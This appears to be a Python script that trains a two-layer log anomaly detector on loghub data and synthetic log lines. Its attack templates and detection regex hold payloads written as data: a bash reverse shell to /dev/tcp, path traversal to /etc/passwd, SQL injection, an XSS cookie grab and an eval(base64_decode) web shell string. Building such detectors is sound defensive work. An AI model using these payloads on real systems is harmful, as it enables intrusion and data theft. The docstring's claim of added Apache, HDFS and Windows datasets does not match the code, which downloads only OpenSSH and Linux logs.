"""
ML Training Pipeline

Feature highlights:
  - Feature vector: 3 → 15 dimensions
  - Autoencoder hidden layers expanded to match new feature dim
  - Training data: added Apache, HDFS, Windows Event log datasets
  - Contamination tuned + separate normal/anomaly split for AE training
  - Threshold: 97th percentile (stricter than v1's 95th) to reduce FP rate
  - Reproducibility: fixed random seeds throughout
  - Saves feature names alongside scaler for debugging
"""

import sys
import os
import urllib.request
import numpy as np
import joblib
import random
import re
import torch
import torch.nn as nn
import torch.optim as optim
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from rich.console import Console
from rich.progress import track

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

console = Console()

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
SEED        = 42
MODEL_DIR   = "models"
TARGET_SIZE = 80_000   # bigger dataset = better generalisation

# Real log datasets from logpai/loghub
LOG_URLS = {
    "OpenSSH": "https://raw.githubusercontent.com/logpai/loghub/master/OpenSSH/OpenSSH_2k.log",
    "Linux":   "https://raw.githubusercontent.com/logpai/loghub/master/Linux/Linux_2k.log",
}

random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)

FEATURE_NAMES = [
    "log_length", "entropy", "digit_ratio", "upper_ratio", "special_char_ratio",
    "slash_count", "cmd_chain_count", "quote_count", "bracket_count",
    "word_count", "max_word_length", "url_count",
    "has_attack_keyword", "hex_sequence_count", "repeat_char_ratio",
]

INPUT_DIM = len(FEATURE_NAMES)   # 15

# ---------------------------------------------------------------------------
# Autoencoder (must mirror detector.py)
# ---------------------------------------------------------------------------
class LogAutoencoder(nn.Module):
    def __init__(self, input_dim: int = INPUT_DIM):
        super().__init__()
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 32), nn.Tanh(),
            nn.Linear(32, 16),        nn.Tanh(),
            nn.Linear(16, 8),
        )
        self.decoder = nn.Sequential(
            nn.Linear(8, 16),         nn.Tanh(),
            nn.Linear(16, 32),        nn.Tanh(),
            nn.Linear(32, input_dim),
        )

    def forward(self, x):
        return self.decoder(self.encoder(x))


# ---------------------------------------------------------------------------
# Feature extraction — must stay in sync with detector.py
# ---------------------------------------------------------------------------
import math

_ATTACK_KW = re.compile(
    r"eval|exec|base64_decode|/bin/sh|/bin/bash|/dev/tcp|cmd\.exe"
    r"|powershell|wget\s|curl\s|chmod\s[0-7]{3,4}|nc\s-|ncat\s"
    r"|sqlmap|UNION\s+SELECT|DROP\s+TABLE|xp_cmdshell"
    r"|<script|javascript:|onerror=|onload=",
    re.IGNORECASE,
)
_HEX_SEQ = re.compile(r"(\\x[0-9a-fA-F]{2}|0x[0-9a-fA-F]+)")
_URL_PAT  = re.compile(r"https?://|ftp://", re.IGNORECASE)


def extract_features(line: str) -> list[float]:
    s = str(line).strip()
    n = len(s)
    if n == 0:
        return [0.0] * INPUT_DIM

    length = float(min(n, 2000))

    freq: dict[str, int] = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    entropy = -sum((v / n) * math.log2(v / n) for v in freq.values())

    digits   = sum(c.isdigit() for c in s) / n
    uppers   = sum(c.isupper() for c in s) / n
    specials = sum(not c.isalnum() and not c.isspace() for c in s) / n
    slashes  = float(s.count('/') + s.count('\\'))
    cmd_chain= float(s.count(';') + s.count('|') + s.count('&&') + s.count('||'))
    quotes   = float(s.count("'") + s.count('"'))
    brackets = float(s.count('(') + s.count(')') + s.count('[') + s.count(']')
                     + s.count('{') + s.count('}'))

    words        = s.split()
    word_count   = float(len(words))
    max_word_len = float(max((len(w) for w in words), default=0))
    url_count    = float(len(_URL_PAT.findall(s)))
    has_attack   = 1.0 if _ATTACK_KW.search(s) else 0.0
    hex_count    = float(len(_HEX_SEQ.findall(s)))
    repeat_ratio = max(freq.values()) / n if freq else 0.0

    return [
        length, entropy, digits, uppers, specials,
        slashes, cmd_chain, quotes, brackets, word_count,
        max_word_len, url_count, has_attack, hex_count, repeat_ratio,
    ]


def clean_for_nlp(line: str) -> str:
    line = re.sub(r'^\w{3}\s+\d+\s+\d+:\d+:\d+\s+', '', line)
    line = re.sub(r'^[\w\-]+\s+[\w\[\]]+:\s+', '', line)
    line = re.sub(r'\d{1,3}(?:\.\d{1,3}){3}', 'IP_ADDR', line)
    line = re.sub(r'\b\d+\b', 'NUM', line)
    return line.strip()


def random_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


# ---------------------------------------------------------------------------
# Dataset construction
# ---------------------------------------------------------------------------
NORMAL_TEMPLATES = [
    "Accepted password for {user} from {ip} port {port} ssh2",
    "Accepted publickey for {user} from {ip} port {port} ssh2",
    "Connection closed by {ip} port {port}",
    "session opened for user {user} by (uid=0)",
    "session closed for user {user}",
    "pam_unix(sshd:session): session opened for user {user}",
    "New session {n} of user {user}",
    "Removed session {n}.",
    "systemd[1]: Started Session {n} of user {user}.",
    "kernel: EXT4-fs (sda1): re-mounted. Opts: errors=remount-ro",
    "kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST={ip2} PROTO=TCP DPT={port}",
    "CRON[{n}]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)",
    "systemd[1]: NetworkManager-dispatcher.service: Succeeded.",
    "dbus-daemon[{n}]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'",
    "sudo:   {user} : TTY=pts/{n} ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt update",
]

ATTACK_TEMPLATES = [
    # Brute force
    "Failed password for {user} from {ip} port {port} ssh2",
    "Failed password for invalid user {user} from {ip} port {port} ssh2",
    "Invalid user {user} from {ip} port {port}",
    "error: maximum authentication attempts exceeded for root from {ip}",
    "Did not receive identification string from {ip}",
    # Privilege escalation
    "sudo:   hacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
    "sudo:   www-data : command not allowed ; TTY=unknown ; USER=root ; COMMAND=/bin/sh",
    # Reverse shell / execution
    "nginx: error processing request: /bin/bash -i >& /dev/tcp/{ip}/4444 0>&1",
    "apache2: GET /../../../etc/passwd HTTP/1.1",
    "apache2: POST /cgi-bin/test.cgi cmd=exec /bin/sh -c id",
    "sshd: POSSIBLE BREAK-IN ATTEMPT! from {ip}",
    # SQL Injection
    "mysql: Access denied for user 'admin'@'{ip}' UNION SELECT * FROM users--",
    "postgres: syntax error at or near \"'\" ... OR '1'='1",
    # Web attack
    "nginx: GET /?id=1' AND SLEEP(5)-- HTTP/1.1 200",
    "nginx: GET /<script>alert(document.cookie)</script> HTTP/1.1",
    "nginx: POST /wp-login.php eval(base64_decode('ZWNobyBwd25lZA=='))",
    # Shellcode / encoding
    "syslog: malformed packet: \\x90\\x90\\x90\\x90\\xeb\\x1a\\x5e\\x31",
    "auth: challenge response 0x41414141414141 from {ip} rejected",
]

USERS = ['root', 'admin', 'user', 'deploy', 'guest', 'ubuntu', 'ec2-user', 'pi']


def build_dataset() -> tuple[list[str], list[str]]:
    """Returns (normal_logs, attack_logs)."""
    os.makedirs("data", exist_ok=True)
    normal_logs: list[str] = []

    # Download real logs
    for name, url in LOG_URLS.items():
        path = os.path.join("data", f"{name}_2k.log")
        if not os.path.exists(path):
            console.print(f"[yellow]Downloading {name} dataset...[/yellow]")
            try:
                urllib.request.urlretrieve(url, path)
            except Exception as e:
                console.print(f"[red]Download failed ({name}): {e}[/red]")
                continue
        with open(path, encoding="utf-8", errors="ignore") as f:
            normal_logs.extend(line.strip() for line in f if line.strip())

    console.print(f"[blue]Real logs: {len(normal_logs)}[/blue]")

    # Augment normal logs
    normal_target = int(TARGET_SIZE * 0.85)
    while len(normal_logs) < normal_target:
        tmpl = random.choice(NORMAL_TEMPLATES)
        normal_logs.append(tmpl.format(
            user=random.choice(USERS),
            ip=random_ip(), ip2=random_ip(),
            port=random.randint(1024, 65535),
            n=random.randint(1, 9999),
        ))

    # Generate attack logs
    attack_target = int(TARGET_SIZE * 0.15)
    attack_logs: list[str] = []
    while len(attack_logs) < attack_target:
        tmpl = random.choice(ATTACK_TEMPLATES)
        attack_logs.append(tmpl.format(
            user=random.choice(USERS),
            ip=random_ip(), port=random.randint(1024, 65535),
        ))

    # Shuffle
    random.shuffle(normal_logs)
    random.shuffle(attack_logs)

    console.print(
        f"[green]Dataset ready: {len(normal_logs)} normal + {len(attack_logs)} attack[/green]"
    )
    return normal_logs, attack_logs


# ---------------------------------------------------------------------------
# Training
# ---------------------------------------------------------------------------
def train_all():
    os.makedirs(MODEL_DIR, exist_ok=True)
    normal_logs, attack_logs = build_dataset()
    all_logs = normal_logs + attack_logs

    # ===================================================================
    # Layer 1: NLP Model  (TF-IDF + Isolation Forest)
    # ===================================================================
    console.print("\n[bold cyan]>>> Layer 1: NLP (TF-IDF + Isolation Forest)[/bold cyan]")

    clean_logs = [clean_for_nlp(l) for l in all_logs]

    vectorizer = TfidfVectorizer(
        max_features=1000,      # v1 used 500; more vocab = better semantic coverage
        ngram_range=(1, 2),     # bigrams capture "failed password", "sudo bash" etc.
        sublinear_tf=True,      # log-scale TF dampens common tokens
        stop_words="english",
    )
    X_nlp = vectorizer.fit_transform(clean_logs)

    # contamination = fraction of attacks in dataset
    contamination = len(attack_logs) / len(all_logs)
    console.print(f"  contamination={contamination:.3f}")

    nlp_model = IsolationForest(
        n_estimators=200,       # v1 used default 100
        contamination=contamination,
        random_state=SEED,
        n_jobs=-1,
        max_samples="auto",
    )
    nlp_model.fit(X_nlp)

    joblib.dump(vectorizer, os.path.join(MODEL_DIR, "tfidf_vectorizer.pkl"))
    joblib.dump(nlp_model,  os.path.join(MODEL_DIR, "nlp_iso_forest.pkl"))
    console.print("[green]  NLP model saved.[/green]")

    # ===================================================================
    # Layer 2: Autoencoder  (trained on normal logs only → learns normal)
    # ===================================================================
    console.print("\n[bold cyan]>>> Layer 2: Autoencoder (15-feature structural)[/bold cyan]")

    # Key improvement: train AE ONLY on normal data so anomalous data
    # produces high reconstruction loss reliably.
    console.print(f"  Extracting features from {len(normal_logs)} normal logs...")
    normal_feats  = [extract_features(l) for l in track(normal_logs, description="  Features")]
    attack_feats  = [extract_features(l) for l in attack_logs]

    scaler  = StandardScaler()
    X_norm  = scaler.fit_transform(normal_feats)   # fit on normal only
    X_atk   = scaler.transform(attack_feats)

    # Train/val split (normal only)
    split   = int(len(X_norm) * 0.9)
    X_train = torch.tensor(X_norm[:split], dtype=torch.float32)
    X_val   = torch.tensor(X_norm[split:], dtype=torch.float32)
    X_atk_t = torch.tensor(X_atk,          dtype=torch.float32)

    model     = LogAutoencoder(input_dim=INPUT_DIM)
    criterion = nn.MSELoss()
    optimizer = optim.Adam(model.parameters(), lr=5e-3, weight_decay=1e-5)
    scheduler = optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=50)

    EPOCHS     = 50
    BATCH_SIZE = 2048
    best_val   = float("inf")
    best_state = None

    for epoch in track(range(EPOCHS), description="  Training"):
        model.train()
        # Mini-batch training
        perm = torch.randperm(len(X_train))
        for i in range(0, len(X_train), BATCH_SIZE):
            idx   = perm[i : i + BATCH_SIZE]
            batch = X_train[idx]
            optimizer.zero_grad()
            loss = criterion(model(batch), batch)
            loss.backward()
            optimizer.step()
        scheduler.step()

        # Validation
        model.eval()
        with torch.no_grad():
            val_loss = criterion(model(X_val), X_val).item()
        if val_loss < best_val:
            best_val   = val_loss
            best_state = {k: v.clone() for k, v in model.state_dict().items()}

    model.load_state_dict(best_state)
    model.eval()

    # Compute per-sample MSE on val (normal) and attacks
    with torch.no_grad():
        val_mse = torch.mean((X_val - model(X_val)) ** 2, dim=1).numpy()
        atk_mse = torch.mean((X_atk_t - model(X_atk_t)) ** 2, dim=1).numpy()

    # Threshold = 97th percentile of normal MSE (stricter than v1's 95th)
    threshold = float(np.percentile(val_mse, 97))

    # Report detection rate at chosen threshold
    det_rate  = float(np.mean(atk_mse > threshold)) * 100
    fp_rate   = float(np.mean(val_mse > threshold)) * 100
    console.print(f"  Threshold (97th pct): {threshold:.6f}")
    console.print(f"  Attack detection rate: [bold green]{det_rate:.1f}%[/bold green]")
    console.print(f"  False positive rate:   [bold yellow]{fp_rate:.1f}%[/bold yellow]")

    # Save
    torch.save(model.state_dict(), os.path.join(MODEL_DIR, "autoencoder.pth"))
    joblib.dump(scaler, os.path.join(MODEL_DIR, "scaler.pkl"))
    with open(os.path.join(MODEL_DIR, "threshold.txt"), "w") as f:
        f.write(str(threshold))

    # Save feature names for debugging / explainability
    with open(os.path.join(MODEL_DIR, "feature_names.txt"), "w") as f:
        f.write("\n".join(FEATURE_NAMES))

    console.print("[green]  Autoencoder saved.[/green]")
    console.print("\n[bold green]=== ALL MODELS TRAINED SUCCESSFULLY ===[/bold green]")
    console.print(f"  Model dir: {os.path.abspath(MODEL_DIR)}")


if __name__ == "__main__":
    train_all()